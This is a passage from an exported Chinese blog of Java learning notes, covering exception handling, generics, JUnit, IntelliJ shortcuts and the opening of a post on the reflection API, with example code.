//将String 转成int\n        int num = Integer.parseInt(name);//抛出NumberFormatException\n        System.out.println(num);\n    }\n}\n```\n\n### 常见编译时异常\n\n- SQLException //操作数据库时，查询表可能发生异常\n- IOException //操作文件时，发生的异常\n- FileNotFoundException //当操作一个不存在的文件时，发生异常\n- ClassNotFoundException //加载类，而该类不存在时，异常\n- EOFException //操作文件，到文件末尾，发生异常\n- IllegalArguementException //参数异常\n\n### 异常处理\n\n异常处理就是当异常发生时，对异常处理的方式。\n\n#### 异常处理的方式\n\n- try-catch-finally\n  - 程序员在代码中捕获发生的异常，自行处理\n- throws\n  - 将发生的异常抛出，交给调用者(方法)来处理，最顶级的处理者就是JVM\n\n#### try-catch 异常处理\n\n> Java提供try和catch块来处理异常。 try块用于包含可能出错的代码。catch块用于处理try块中发生的异常。可以根据需要在程序中有多个try..catch块。\n\n- 1.如果异常发生了，则异常发生后面的代码不会执行，直接进入到catch块\n- 2.如果异常没有发生，则顺序执行try的代码块，不会进入到catch块\n- 3.如果希望不管是否发生异常，都执行某段代码(比如关闭连接，释放资源等)则使用如下代码finally\n\n```java\npublic class TryCatchDetail {\n    public static void main(String[] args) {\n        try {\n            String str = \"测试\";\n            int a = Integer.parseInt(str);\n            System.out.println(\"数字：\" + a);\n        } catch (NumberFormatException e) {\n            System.out.println(\"异常信息：\" + e.getMessage());\n        } finally {\n            System.out.println(\"finally 代码块被执行...\");\n        }\n        System.out.println(\"程序继续...\");\n    }\n}\n```\n\n- 4.可以有多个catch语句，捕获不同的异常(进行不同的业务处理)，要求父类异常在后，子类异常在前，比如(Exception 在后，NullPointerException 在前)，如果发生异常，只会匹配一个catch\n\n```java\npublic class TryCatchDetail02 {\n    public static void main(String[] args) {\n        //1.如果try 代码块有可能有多个异常\n        //2.可以使用多个catch 分别捕获不同的异常，相应处理\n        //3.要求子类异常写在前面，父类异常写在后面\n        try {\n            Person person = new Person();\n            person = null;\n            System.out.println(person.getName());//NullPointerException\n        } catch (NullPointerException e) {\n            System.out.println(\"空指针异常:\" + e.getMessage());\n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}\n\nclass Person {\n    private String name = \"jack\";\n\n    public String getName() {\n        return name;\n    }\n}\n```\n\n- 5.可以进行try-finally配合使用，这种用法相当于没有捕获异常，因此程序会直接崩掉/退出。应用场景，就是执行一段代码，不管是否发生异常，都必须执行某个业务逻辑\n\n```java\npublic class TryCatchDetail03 {\n\t\tpublic static void main(String[] args) {\n\t\t\t\ttry{\n            int n1 = 10;\n            int n2 = 0;\n            System.out.println(n1 / n2);\n    \t\t}finally {\n    \t\t\t\tSystem.out.println(\"执行了finally..\");\n    \t\t}\n    \t\tSystem.out.println(\"程序继续执行..\");\n    }\n}\n```\n\n## 泛型\n\n### 什么是泛型\n\n- Java泛型（generics）是 JDK 5 中引入的一个新特性，在很大的程度上方便在集合上的使用。\n- 泛型的本质是 **参数化类型**，最熟悉的就是定义方法的时候需要形参，调用方法的时候，需要传递实参。那\"参数化类型\"就是将原来具体的类型参数化\n\n### 泛型目的\n\n- 泛型的出现避免了在运行时强制类型转换而出现 ClassCastException (类型转化异常)。\n\n### 泛型引出\n\n请编写程序，在 ArrayList 中，添加 3 个 Dog 对象，Dog 对象含有 name 和 age，并输出 name 和age (要求使用getXxx())\n\n#### 传统方法\n\n```java\npackage com.jwt.generic;\n\nimport java.util.ArrayList;\n\npublic class Generic01 {\n    public static void main(String[] args) {\n\n        ArrayList arrayList = new ArrayList();\n        arrayList.add(new Dog(\"小黄\",10));\n        arrayList.add(new Dog(\"小白\",2));\n        arrayList.add(new Dog(\"小黑\",5));\n        for (Object o : arrayList){\n            Dog dog = (Dog) o;//需要向下转型Object ->Dog\n            System.out.println(dog.getName());\n        }\n\n    }\n}\n\nclass Dog {\n    private String name;\n    private int age;\n\n    public Dog() {\n    }\n\n    public Dog(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n}\n```\n\n#### 使用泛型\n\n```java\npackage com.jwt.generic;\n\nimport java.util.ArrayList;\n\npublic class Generic02 {\n    public static void main(String[] args) {\n        ArrayList<Dog> arrayList = new ArrayList<>();\n        arrayList.add(new Dog(\"小黄\",10));\n        arrayList.add(new Dog(\"小白\",2));\n        arrayList.add(new Dog(\"小黑\",5));\n        for (Dog dog : arrayList){\n            System.out.println(dog.getName());\n        }\n    }\n}\n\nclass Dog {\n    private String name;\n    private int age;\n\n    public Dog() {\n    }\n\n    public Dog(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n}\n```\n\n### 泛型优点\n\n- 编译时，检查添加元素的类型，提高了安全性\n- 不再提示编译警告\n- 减少了类型转换的次数，提高效率\n  - 不使用泛型 Dog -> Object -> Dog //放入到 ArrayList 会先转成 Object，在取出时，还需要转换成 Dog\n  - 使用泛型 Dog-> Dog -> Dog //放入和取出时，不需要类型转换，提高效率\n\n### 泛型使用\n\n泛型有三种常用的使用方式：**泛型类，泛型接口和泛型方法**。\n\n#### 泛型类\n\n```java\nclass Person<E>{//如果创建对象时没有指定类型，默认是 Object\n\t\t\t\tE s;\n\t\t\t\tpublic Person(E s) {\n\t\t\t\tthis.s = s;\n\t\t\t\t}\n}\n```\n\n- 泛型类型必须是**引用类型**（非基本数据类型）\n\n  ```java\n  List<Integer> list = new ArrayList<Integer>(); //正确\n  List<int> list2 = new ArrayList<int>();//错误\n  ```\n\n- 泛型的使用形式\n\n  ```java\n  List<Integer> list = new List<Integer>();\n  List<Integer> list = new List<>();//推荐使用简写\n  ```\n\n- 静态方法和静态属性不能使用泛型\n\n- 泛型默认是Object\n\n  ```java\n  List List = new List();\n  //等价\n  List<Object> List = new List<>();\n  ```\n\n- 由于使用自定义泛型的类，只有在实例化的时候才知道这个类型参数是什么，所以导致\n\n  - （1）使用泛型的数组不能初始化；\n\n  - （2）静态方法和静态属性并不能使用泛型。\n\n#### 泛型接口\n\n```java\npublic interface Test_ <E>{\n\t//...\n}\n```\n\n泛型接口的类型，在**继承接口** 或者 **实现接口**时确定。（默认Object）\n\n例子\n\n```java\n/**\n * 泛型接口的定义格式:  修饰符  interface 接口名<数据类型> {}\n */\npublic interface Inter<T> {\n    public abstract void show(T t) ;\n}\n\n/**\n * 子类是泛型类\n */\npublic class InterImpl<E> implements Inter<E> {\n    @Override\n    public void show(E t) {\n        System.out.println(t);\n    }\n}\n\n\nInter<String> inter = new InterImpl<String>() ;\ninter.show(\"hello\") ;\n\n```\n\n#### 泛型方法\n\n```java\npublic <E> void Come(E e){\n   //...\n}\n```\n\n- 泛型方法，可以使用类声明的泛型，也可以使用自己声明泛型\n\n  ```java\n  class Fish<T, R> {//泛型类\n    public void run() {//普通方法\n    }\n    public<U,M> void eat(U u, M m) {//泛型方法\n    }\n    //说明\n    //1. 下面hi 方法不是泛型方法\n    //2. 是hi 方法使用了类声明的泛型\n    public void hi(T t) {\n    }\n    //泛型方法，可以使用类声明的泛型，也可以使用自己声明泛型\n    public<K> void hello(R r, K k) {\n    System.out.println(r.getClass());//ArrayList\n    System.out.println(k.getClass());//Float\n    }\n  }\n  ```\n\n  \n\n例子\n\n```java\nclass Demo{  \n  public <T> T fun(T t){   // 可以接收任意类型的数据  \n   return t ;     // 直接把参数返回  \n  }  \n};  \npublic class GenericsDemo{  \n  public static void main(String args[]){  \n    Demo d = new Demo() ; // 实例化Demo对象  \n    String str = d.fun(\"汤姆\") ; // 传递字符串  \n    int i = d.fun(30) ;  // 传递数字，自动装箱  \n    System.out.println(str) ; // 输出内容  \n    System.out.println(i) ;  // 输出内容  \n  }  \n};\n\n```\n\n#### 源码中泛型使用\n\n下面是List接口和ArrayList类的代码片段\n\n```java\n//定义接口时指定了一个类型形参，该形参名为E\npublic interface List<E> extends Collection<E> {\n   //在该接口里，E可以作为类型使用\n   public E get(int index) {}\n   public void add(E e) {} \n}\n\n//定义类时指定了一个类型形参，该形参名为E\npublic class ArrayList<E> extends AbstractList<E> implements List<E> {\n   //在该类里，E可以作为类型使用\n   public void set(E e) {\n   .......................\n   }\n}\n\n```\n\n#### 实例\n\n- 定义Employee类\n  - 该类包含: private成员变量name,sal,birthday, 其中birthday为MyDate类的对象;\n  - 为每一个属性定义getter, setter方法;\n  - 重写toString方法输出name, sal, birthday\n\n- 定义MyDate类\n  - 包含: private成员变量month,day,year; \n  - 并为每一个属性定义getter,setter方法;\n- 创建该类的3个对象，并把这些对象放入ArrayList集合中(ArrayList需使用泛型来定义) \n  - 对集合中的元素进行排序，并遍历输出\n  - 排序方式:调用ArrayList 的sort方法，传入Comparator对象[使用泛型]，先按照\n    name排序，如果name相同，则按生日日期的先后排序。 即:定制排序\n\nEmployee.java\n\n```java\npackage com.jwt.generic;\n\npublic class Employee {\n    private String name;\n    private double sal;\n    private MyDate birthday;\n\n    public Employee(String name, double sal, MyDate birthday) {\n        this.name = name;\n        this.sal = sal;\n        this.birthday = birthday;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public double getSal() {\n        return sal;\n    }\n\n    public void setSal(double sal) {\n        this.sal = sal;\n    }\n\n    public MyDate getBirthday() {\n        return birthday;\n    }\n\n    public void setBirthday(MyDate birthday) {\n        this.birthday = birthday;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nEmployee{\" +\n                \"name='\" + name + '\\'' +\n                \", sal=\" + sal +\n                \", birthday=\" + birthday +\n                '}';\n    }\n}\n```\n\nMyDate.java\n\n```java\npackage com.jwt.generic;\n\nclass MyDate implements Comparable<MyDate> {\n    private int year;\n    private int month;\n    private int day;\n\n    public MyDate(int year, int month, int day) {\n        this.year = year;\n        this.month = month;\n        this.day = day;\n    }\n\n    public int getYear() {\n        return year;\n    }\n\n    public void setYear(int year) {\n        this.year = year;\n    }\n\n    public int getMonth() {\n        return month;\n    }\n\n    public void setMonth(int month) {\n        this.month = month;\n    }\n\n    public int getDay() {\n        return day;\n    }\n\n    public void setDay(int day) {\n        this.day = day;\n    }\n\n    @Override\n    public String toString() {\n        return \"MyDate{\" +\n                \"year=\" + year +\n                \", month=\" + month +\n                \", day=\" + day +\n                '}';\n    }\n\n\n    @Override\n    public int compareTo(MyDate o) {\n        int yearMinus = year - o.getYear();\n        if (yearMinus != 0) {\n            return yearMinus;\n        }\n        //如果year相同，比较month\n        int monthMinus = month - o.getMonth();\n        if (monthMinus != 0) {\n            return monthMinus;\n        }\n        //如果year和month相同\n        return day - o.getDay();\n    }\n}\n```\n\nMain.java\n\n```java\npackage com.jwt.generic;\n\nimport java.util.ArrayList;\nimport java.util.Comparator;\n\npublic class GenericExercise02\n{\n    public static void main(String[] args) {\n        ArrayList<Employee> employees = new ArrayList<>();\n        employees.add(new Employee(\"小明\",10000, new MyDate(2000,7,2)));\n        employees.add(new Employee(\"小红\",20000, new MyDate(2002,10,2)));\n        employees.add(new Employee(\"小明\",30000, new MyDate(2000,6,2)));\n\n        System.out.println(\"employees=\" + employees);\n\n        employees.sort(new Comparator<Employee>() {\n        @Override\n        public int compare(Employee emp1, Employee emp2) {\n            //先按照name排序，如果name相同，则按生日日期的先后排序。【即：定制排序】\n            //先对传入的参数进行验证\n            if (!(emp1 instanceof Employee && emp2 instanceof Employee)) {\n                System.out.println(\"类型不正确..\");\n                return 0;\n            }\n            //比较name\n            int i = emp1.getName().compareTo(emp2.getName());\n            if (i != 0) {\n                return i;\n            }\n            //封装后，将来可维护性和复用性，就大大增强.\n            return emp1.getBirthday().compareTo(emp2.getBirthday());\n        }\n        });\n        System.out.println(\"==对雇员进行排序==\");\n        System.out.println(employees);\n    }\n}\n```\n\n### 泛型的继承和通配符\n\n- 泛型不具备继承性\n\n  ```java\n  //Object是String的父类\n  Object o = new String(\"xx\");//正确\n  List<Object> list = new ArrayList <String>; //错误\n  ```\n\n- 通配符\n\n  - `<?>` :支持任意泛型类型\n\n  - `<? extends A>`:支持A类以及A类的子类，规定了泛型的上限\n\n  - `<? super A>`:支持A类以及A类的父类，不限于直接父类，规定了泛型的下限\n\n```java\npackage com.jwt.generic;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class GenericExtends {\n    public static void main(String[] args) {\n        \n        List<Object> list1 = new ArrayList<>();\n        List<String> list2 = new ArrayList<>();\n        List<AA> list3 = new ArrayList<>();\n        List<BB> list4 = new ArrayList<>();\n        List<CC> list5 = new ArrayList<>();\n        \n        //如果是List<?> c ，可以接受任意的泛型类型\n        printCollection1(list1);\n        printCollection1(list2);\n        printCollection1(list3);\n        printCollection1(list4);\n        printCollection1(list5);\n        \n        //List<? extends AA> c： 表示上限，可以接受AA 或者AA 子类\n        printCollection2(list1);//×\n        printCollection2(list2);//×\n        printCollection2(list3);//√\n        printCollection2(list4);//√\n        printCollection2(list5);//√\n\n        //List<? super AA> c: 支持AA 类以及AA 类的父类，不限于直接父类\n        printCollection3(list1);//√\n        printCollection3(list2);//×\n        printCollection3(list3);//√\n        printCollection3(list4);//×\n        printCollection3(list5);//×\n\n    }\n\n    \n    //说明: List<?> 表示任意的泛型类型都可以接受\n    public static void printCollection1(List<?> c) {\n        for (Object object : c) { // 通配符，取出时，就是Object\n            System.out.println(object);\n        }\n    }\n    \n    // ? extends ，可以接受AA 或者AA 子类\n    public static void printCollection2(List<? extends AA> c) {\n        for (Object object : c) {\n            System.out.println(object);\n        }\n    }\n    \n    // ? super，支持AA 类以及AA 类的父类，不限于直接父类，\n    public static void printCollection3(List<? super AA> c) {\n        for (Object object : c) {\n            System.out.println(object);\n        }\n    }\n}\n\nclass AA {\n}\n\nclass BB extends AA {\n}\n\nclass CC extends BB {\n}\n```\n\n- [java 泛型全解 - 绝对最详细 - 掘金 (juejin.cn)](https://juejin.cn/post/6844903925666021389)\n\n## 正则\n\n。。。\n\n## 其他\n\n### 类型转换\n\n- new String(char[])：将char[]转换成String\n- new String(char[],off,len)：将char[]的指定部分转换成String\n- str.toCharArray()：将String转换成char[]\n- Integer.parseInt(str)：将String转换成int\n\n### Junit\n\n- 1.一个类有很多功能代码需要测试， 为了测试，就需要写入到main方法中\n- 2.如果有多个功能代码测试，就需要来回注销，切换很麻烦\n- 3.如果可以直接运行一个方法，就方便很多，并且可以给出相关信息，就好了\n\nJUnit是一个Java语言的单元测试框架，多数Java的开发环境都已经集成了JUnit作为单元测试的工具\n\n#### 传统方法\n\n```java\npackage com.jwt.generic;\n\npublic class JUnit_ {\n    public static void main(String[] args) {\n        //传统方式\n        new JUnit_().m1();\n        new JUnit_().m2();\n    }\n  \n    public void m1 () {\n        System.out.println(\"m1 方法被调用\");\n    }\n  \n    public void m2 () {\n        System.out.println(\"m2 方法被调用\");\n    }\n}\n```\n\n#### 使用JUnit\n\n```java\npackage com.jwt.generic;\n\npublic class JUnit_ {\n  \n    @Test\n    public void m1 () {\n        System.out.println(\"m1 方法被调用\");\n    }\n  \n    @Test\n    public void m2 () {\n        System.out.println(\"m2 方法被调用\");\n    }\n}\n```\n\n### 快捷操作\n\n#### 添加构造函数\n\nMac：Ctrl + enter\n\nWin：AIt + Inster\n\n#### 自动导包\n\n首先进入设置选项-->编辑器-->常规-->自动导包-->勾选对应项\n\n#### 包围代码\n\n使用if..else, try..catch, for, synchronized等包围选中的代码\n\nWin：Ctrl + Alt + t\n\nMac：option + command + t \n\n#### 选择导包\n\nWin：Alt + enter\n\nMac：option + enter\n\n#### 补全括号或者分号\n\nShift + command + enter\n\n#### 显示所有的快捷键\n\nWin：Ctrl + j\n\nMac：Command + j\n\n#### 快捷生成代码\n\n快速生成打印：sout\n\n快速生成打印当前值：soutv\n\n快速生成增强for：I\n\n快速生成main方法：main\n\n快速生成迭代器while：输入 itit\n\n#### 多行操作\n\nWin：AIt+鼠标左键不放，拖动即可\n\nMac：option+鼠标左键不放，拖动即可\n\n#### 转到任意类\n\nWin：Ctrl+Shift+t\n\nMac：Command+o\n\n#### 搜索类中的方法\n\nWin：Ctrl+F12\n\nMac：Command+F12\n\n#### 代码上下移动\n\nWin：Ctrl+Shift+↑/↓\n\nMac：Command+Shift+↑/↓\n\n#### 查看函数参数\n\nWin：Ctrl+p\n\nMac：Command+p\n\n#### 大小写转换\n\nWin：Ctrl+Shift+u\n\nMac：Command+Shift+u\n\n#### 封装代码成方法\n\nWin：Ctrl+Alt+m\n\nMac：Command+option+m\n\n### 隐藏指定文件\n\n1. 【Files】→【Settings】\n2. 【Editor】→【File Types】→【Ignored Files and Folders】\n3. 输入要隐藏的名称，支持*号通配符\n4. 回车确认添加\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["学习笔记"],"categories":["JavaSE"]},{"title":"Java-反射","url":"/posts/13406.html","content":"\n## 前言\n\n哈喽！大家好，我是小简。今天开始学习《Java-反射》，此系列是我做的一个 “Java 从 0 到 1 ” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计3天更新完\n- [x] 🎯开始时间：04-06\n- [x] 🎉结束时间：04-09\n- [x] 🍀总结：用时4天，但实际用时是2天，中间两天在看论文，没有更新\n\n## 反射引出\n\n### 一个需求\n\n根据配置文件 re.properties 指定信息，创建 Cat 对象并调用方法 hi\n\n```\nclassfullpath=com.jwt.Cat\nmethod=hi\n```\n\n这样的需求在学习框架时很多，**即在通过外部文件配置，在不修改源码的情况下，来控制程序**。\n\n### 传统方法\n\n传统的方法是先 new 一个对象，然后再调用它的方法。\n\n```java\nCat cat = new Cat();\ncat.hi();\n```\n\n通过传统方法，确实可以调用 hi() 方法，但是这和我们的需求不一样，这里我们是要根据配置文件 re.properties 指定信息来完成。可以使用 Properties 来读取配置文件。\n\n```java\nProperties properties = new Properties();\nproperties.load(new FileInputStream(\"src//re.properties\"));\nString classfullpath = properties.getProperty(\"classfullpath\");//\"com.jwt.Cat\"\nString methodName = properties.getProperty(\"method\");//\"hi\"\nSystem.out.println(\"classfullpath=\" + classfullpath);\nSystem.out.println(\"method=\" + methodName);\n```\n\n然后需要创建对象，怎么创建对象呢？直接`new classfullpath`，这样不就好了嘛？嗯，想法不错，下回不要想了。现在的 classfullpath 可是字符串类型，怎么能去`new`呢。所以现有技术是做不到这个事情的。那么这里就要引入我们要将的重点——反射机制。\n\n### 反射方法\n\n```java\npackage com.jwt.reflection;\n\nimport java.io.FileInputStream;\nimport java.lang.reflect.Method;\nimport java.util.Properties;\n\npublic class ReflectionQuestion {\n    public static void main(String[] args) throws Exception {\n        //1. 使用Properties 类, 可以读取配置文件\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//re.properties\"));\n        String classfullpath = properties.getProperty(\"classfullpath\");//\"com.jwt.Cat\"\n        String methodName = properties.getProperty(\"method\");//\"hi\"\n        System.out.println(\"classfullpath=\" + classfullpath);\n        System.out.println(\"method=\" + methodName);\n      \n        //2. 使用反射机制解决\n        //(1) 加载类, 返回Class类型的对象cls\n        Class cls = Class.forName(classfullpath);\n        System.out.println(\"cls = \" + cls);\n        //(2) 通过cls得到你加载的类com.jwt.Cat的对象实例\n        Object o = cls.newInstance();\n        System.out.println(\"o 的运行类型=\" + o.getClass()); //运行类型\n        //(3) 通过cls得到你加载的类com.jwt.Cat的methodName \"hi\" 的方法对象\n        Method method = cls.getMethod(methodName);\n        //(4) 通过method 调用方法: 即通过方法对象来实现调用方法\n        method.invoke(o); //传统方法对象.方法() , 反射机制：方法.invoke(对象)\n    }\n}\n```\n\n反射机制还有一个优点，那就是可以通过外部文件配置，在不修改源码的情况下，来控制程序。比如这里，我在Cat 类下面再写一个方法，cry()方法，如果我们使用传统方法，要调用这个方法，是不是就要修改代码了，比如`cat.cry(); `通过反射，只需在配置文件 re.properties 中，将 method=hi 改为 method=cry 就可以了。\n\n## 反射是什么\n\n### 简介\n\n- 反射机制允许程序在执行时借助于 Reflection API 取得任何类的内部信息(比如成员变量，构造器，成员方法等等)，并能操作对象的属性及方法。\n\n- 在运行状态中，对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法(包括私有)，拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态特性。\n\n- 加载完类之后，在堆中就产生了一个 Class 类型的对象(一个类只有一个Class对象) ，这个对象包含了类的完整结构信息。通过这个对象得到类的结构。这个 Class 对象就像一面镜子，透过这个镜子看到类的结构，所以，形象的称之为反射\n\n**一句话总结：反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。动态特性**\n\n### 反射机制原理示意\n\n![](https://img.jwt1399.top/img/image-20220406162500383.png)\n\n### 反射机制可以完成\n\n- 1.在运行时判断任意个对象所属的类\n- 2.在运行时构造任意一个类的对象\n- 3.在运行时得到任意一个类所具有的成员变量和方法\n- 4.在运行时调用任意一个对象的成员变量和方法\n- 5.生成动态代理\n\n### 反射相关的主要类\n\n- java.lang.Class：代表一个类，Class 对象表示某 个类加载后在堆中的对象\n\n- java.lang.reflect.Method：代表类的方法，Method 对象表示某个类的方法\n- java.lang.reflect.Field：代表类的成员变量，Field 对象表示某个类的成员变量\n- java.lang.reflect.Constructor：代表类的构造方法，Constructor 对象表示构造器\n\n```java\npackage com.jwt.reflection;\n\nimport java.io.FileInputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.util.Properties;\n\npublic class Reflection01 {\n    public static void main(String[] args) throws Exception {\n        //1. 使用Properties 类, 可以读写配置文件\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//re.properties\"));\n        String classfullpath = properties.get(\"classfullpath\").toString();\n        String methodName = properties.get(\"method\").toString();\n        //2. 使用反射机制解决\n        //(1) 加载类, 返回Class 类型的对象cls\n        Class cls = Class.forName(classfullpath);\n        //(2) 通过cls 得到你加载的类com.hspedu.Cat 的对象实例\n        Object o = cls.newInstance();\n        System.out.println(\"o 的运行类型=\" + o.getClass()); //运行类型\n        //java.lang.reflect.Method：代表类的方法，Method 对象表示某个类的方法\n        Method method = cls.getMethod(methodName);\n        //通过method 调用方法: 即通过方法对象来实现调用方法\n        method.invoke(o);\n\n        //java.lang.reflect.Field: 代表类的成员变量, Field 对象表示某个类的成员变量\n        //getField 不能得到私有的属性\n        Field nameField = cls.getField(\"name\");\n        System.out.println(nameField.get(o)); // 传统写法对象.成员变量, 反射: 成员变量对象.get(对象)\n\n        //java.lang.reflect.Constructor: 代表类的构造方法, Constructor 对象表示构造器\n        Constructor constructor = cls.getConstructor(); //()中可以指定构造器参数类型, 返回无参构造器\n        System.out.println(constructor);//Cat()\n        Constructor constructor2 = cls.getConstructor(String.class); //这里传入的String.class 就是String 类的Class 对象\n        System.out.println(constructor2);//Cat(String name)\n    }\n}\n\n```\n\n### 反射优点和缺点\n\n- 优点：可以动态的创建和使用对象(也是框架底层核心)，使用灵活没有反射机制，框架技术就失去底层支撑。\n- 缺点：使用反射基本是解释执行，对执行速度有影响.\n\n**反射调用优化-关闭访问检查**\n\n- Method、Field、 Constructor 对象都有 setAccessible() 方法\n- setAccessible 作用是启动和禁用访问安全检查的开关\n  - 参数值为 true 表示反射的对象在使用时取消访问检查，提高反射的效率。\n  - 参数值为 false 则表示反射的对象执行访问检查\n\n```java\npackage com.jwt.reflection;\n\nimport com.jwt.Cat;\nimport java.lang.reflect.Method;\n\npublic class Reflection02 {\n    public static void main(String[] args) throws Exception {\n        m1();//传统\n        m2();//反射\n        m3();//反射优化\n    }\n\n    //传统方法来调用hi\n    public static void m1() {\n        Cat cat = new Cat();\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 900000000; i++) {\n            cat.hi();\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"m1() 耗时=\" + (end - start)+\"ms\");\n    }\n\n\n    //反射机制调用方法hi\n    public static void m2() throws Exception {\n        Class cls = Class.forName(\"com.jwt.Cat\");\n        Object o = cls.newInstance();\n        Method hi = cls.getMethod(\"hi\");\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 900000000; i++) {\n            hi.invoke(o);//反射调用方法\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"m2() 耗时=\" + (end - start)+\"ms\");\n    }\n\n    //反射调用优化+ 关闭访问检查\n    public static void m3() throws Exception {\n        Class cls = Class.forName(\"com.jwt.Cat\");\n        Object o = cls.newInstance();\n        Method hi = cls.getMethod(\"hi\");\n        hi.setAccessible(true);//在反射调用方法时，取消访问检查\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 900000000; i++) {\n            hi.invoke(o);//反射调用方法\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"m3() 耗时=\" + (end - start)+\"ms\");\n    }\n}\n/**\nm1() 耗时=2ms\nm2() 耗时=934ms\nm3() 耗时=769ms\n**/\n```\n\n## Class 类\n\n### 基本介绍\n\n![](https://img.jwt1399.top/img/image-20220406170726054.png)\n\n1. Class 也是类，继承 Object 类\n2. Class 类对象不是 new 出来的，而是系统创建的\n3. 对于某个类的 Class 类对象，在内存中只有一份，因为类只加载一 次\n4. 每个类的实例都会记得自己是由哪个 Class 实例所生成\n5. 通过 Class 对象可以完整地得到一个类的完整结构\n6. Class 对象是存放在堆的，类的字节码二进制数据， 是放在方法区的，有的地方称为类的元数据(包括方法代码，变量名，方法名，访问权限等等) \n\n### Class类的常用方法\n\n| 方法名                                               | 功能说明                                                     |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n| static Class forName(String name)                    | 返回指定类名name的Class对象                                  |\n| object newlnstance()                                 | 调用缺省构造函数，返回该Class对象的一个实例                  |\n| getName()                                            | 返回此Class对象所表示的实体(类、接口、数组类、基本类型等)名称 |\n| Class [] getInterfaces()                             | 获取当前Class对象的接口                                      |\n| ClassLoader getClassLoader()                         | 返回该类的类加载器                                           |\n| Class getSuperclass()                                | 返回表示此Class所表示的实体的超类的Class                     |\n| Constructor[] getConstructors()                      | 返回一个包含某些Constructor对象的数组                        |\n| Field[]  getDeclaredFields()                         | 返回Field对象的一个数组                                      |\n| Method getMethod(String name,Class...<?> paramTypes) | 返回一个Method对象，此对象的形参类型为paramType              |\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Field;\n\npublic class Class02 {\n    public static void main(String[] args) throws Exception {\n        String classAllPath = \"com.jwt.reflection.Car\";\n        //1 . 获取到Car 类对应的Class 对象\n        Class<?> cls = Class.forName(classAllPath);//<?> 表示不确定的Java 类型\n        //2. 输出cls\n        System.out.println(cls); //显示cls 对象, 是哪个类的Class 对象\n        System.out.println(cls.getClass());//输出cls 运行类型java.lang.Class\n        //3. 得到包名\n        System.out.println(cls.getPackage().getName());//包名\n        //4. 得到全类名\n        System.out.println(cls.getName());\n        //5. 通过cls 创建对象实例\n        Car car = (Car) cls.newInstance();\n        System.out.println(car);//car.toString()\n        //6. 通过反射获取属性brand\n        Field brand = cls.getField(\"brand\");\n        System.out.println(brand.get(car));//宝马\n        //7. 通过反射给属性赋值\n        brand.set(car, \"奔驰\");\n        System.out.println(brand.get(car));//奔驰\n        //8. 得到所有的属性(字段)\n        System.out.println(\"=======所有的字段属性====\");\n        Field[] fields = cls.getFields();\n        for (Field f : fields) {\n            System.out.println(f.getName());//名称\n        }\n    }\n\n}\n\nclass Car {\n    public String brand = \"宝马\";\n    public int price = 500000;\n    public String color = \"白色\";\n\n    @Override\n    public String toString() {\n        return \"Car{\" +\n                \"brand='\" + brand + '\\'' +\n                \", price=\" + price +\n                \", color='\" + color + '\\'' +\n                '}';\n    }\n}\n\n/**\nclass com.jwt.reflection.Car\nclass java.lang.Class\ncom.jwt.reflection\ncom.jwt.reflection.Car\nCar{brand='宝马', price=500000, color='白色'}\n宝马\n奔驰\n=======所有的字段属性====\nbrand\nprice\ncolor\n**/\n```\n\n### 获取Class类对象\n\n1、Class.forName\n\n前提：已知一个类的全名称，且该类路径下，可通过 Class 类的静态方法 forName() 获取，可能抛出ClassNotFoundException 异常\n\n实例：`Class cls1 = Class.forName(“java.lang.Cat”);`\n\n应用场景：多用于配置文件，读取类全路径，加载类\n\n2、类名.class\n\n前提：若已知具体的类，通过类的 class 获取，该方式最为安全可靠，程序性能最高\n\n实例：`Class cls2 = Car.class;`\n\n应用场景：多用于参数传递，比如通过反射得到对应构造器对象\n\n3、对象.getClass()\n\n前提：已知某个类的实例，调用该实例的 getClass() 方法获取 Class 对象\n\n实例：`Class cls3 = 对象.getClass();//运行类型`\n\n应用场景：通过创建好的对象，获取 Class 对象\n\n4、通过类加载器\n\n`ClassLoader classLoader = 对象.getClass().getClassLoader();`\n\n`Class cls4  = classLoader.loadClass(“类的全类名”)；`\n\n5、基本数据（int,char,boolean,float,double,byte,long,short）按如下方式得到Class类对象\n\n`Class 